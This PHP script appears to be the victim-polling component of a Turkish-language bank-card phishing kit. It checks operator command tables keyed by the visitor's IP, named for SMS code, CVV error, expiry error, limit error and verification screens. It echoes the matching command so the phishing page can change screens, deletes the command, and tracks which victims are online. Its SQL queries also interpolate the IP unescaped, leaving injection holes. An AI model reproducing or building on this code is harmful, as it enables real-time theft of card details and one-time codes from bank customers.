<?php

include_once("config.php");
include_once("./txmd/Data/Server/GrabIP.php");

$sms = $pdo->query("SELECT * FROM sms", PDO::FETCH_ASSOC);
foreach ($sms as $row1)
{
    if ($row1['sms'] == $ip)
    {
        echo 'sms';
        $pdo->query("DELETE FROM sms WHERE sms='$ip'");
    }
}

$tebrikler = $pdo->query("SELECT * FROM tebrikler", PDO::FETCH_ASSOC);
foreach ($tebrikler as $row2)
{
    if ($row2['tebrikler'] == $ip)
    {
        echo "tebrikler";
        $pdo->query("DELETE FROM tebrikler WHERE tebrikler='$ip'");
    }   
}

$hata_sms = $pdo->query("SELECT * FROM hata_sms", PDO::FETCH_ASSOC);
foreach ($hata_sms as $row3)
{
    if ($row3['hata_sms'] == $ip)
    {
        echo "hata_sms";
        $pdo->query("DELETE FROM hata_sms WHERE hata_sms='$ip'");
    }
}

$hata_limit = $pdo->query("SELECT * FROM hata_limit", PDO::FETCH_ASSOC);
foreach ($hata_limit as $row4)
{
    if ($row4['hata_limit'] == $ip)
    {
        echo "hata_limit";
        $pdo->query("DELETE FROM hata_limit WHERE hata_limit='$ip'");
    }
}

$hata_internet = $pdo->query("SELECT * FROM hata_internet", PDO::FETCH_ASSOC);
foreach ($hata_internet as $row5)
{
    if ($row5['hata_internet'] == $ip)
    {
        echo "hata_internet";
        $pdo->query("DELETE FROM hata_internet WHERE hata_internet='$ip'");
    }
}

$basa_dondur = $pdo->query("SELECT * FROM basa_dondur", PDO::FETCH_ASSOC);
foreach ($basa_dondur as $row6)
{
    if ($row6['basa_dondur'] == $ip)
    {
        echo "basa_dondur";
        $pdo->query("DELETE FROM basa_dondur WHERE basa_dondur='$ip'");
    }
}

$hata_dogrulama = $pdo->query("SELECT * FROM hata_dogrulama", PDO::FETCH_ASSOC);
foreach ($hata_dogrulama as $row7)
{
    if ($row7['hata_dogrulama'] == $ip)
    {
        echo "hata_dogrulama";
        $pdo->query("DELETE FROM hata_dogrulama WHERE hata_dogrulama='$ip'");
    }
}

$dogrulama = $pdo->query("SELECT * FROM dogrulama", PDO::FETCH_ASSOC);
foreach ($dogrulama as $row8)
{
    if ($row8['dogrulama'] == $ip)
    {
        echo "dogrulama";
        $pdo->query("DELETE FROM dogrulama WHERE dogrulama='$ip'");
    }
}

$hata_skt = $pdo->query("SELECT * FROM hata_skt", PDO::FETCH_ASSOC);
foreach ($hata_skt as $row9)
{
    if ($row9['hata_skt'] == $ip)
    {
        echo "hata_skt";
        $pdo->query("DELETE FROM hata_skt WHERE hata_skt='$ip'");
    }
}

$hata_cvv = $pdo->query("SELECT * FROM hata_cvv", PDO::FETCH_ASSOC);
foreach ($hata_cvv as $row10)
{
    if ($row10['hata_cvv'] == $ip)
    {
        echo "hata_cvv";
        $pdo->query("DELETE FROM hata_cvv WHERE hata_cvv='$ip'");
    }
}


if ($_GET['ip'])
{
    $timex = time() + 7;
    $pdo->query("UPDATE logs SET onlineTimer = '$timex' WHERE ip = '$ip'");

    $query = $pdo->query("SELECT * FROM cevrimici_tablosu WHERE ip = '$ip'")->fetch(PDO::FETCH_ASSOC);
    if ($query)
    {
        $pdo->query("UPDATE cevrimici_tablosu SET onlineTimer = '$timex' WHERE ip = '$ip'");
    }
    else
    {
        $query = $pdo->prepare("INSERT INTO cevrimici_tablosu SET ip = ?, onlineTimer = ?");
        $insert = $query->execute(array($ip, $timex));
    }
}
?>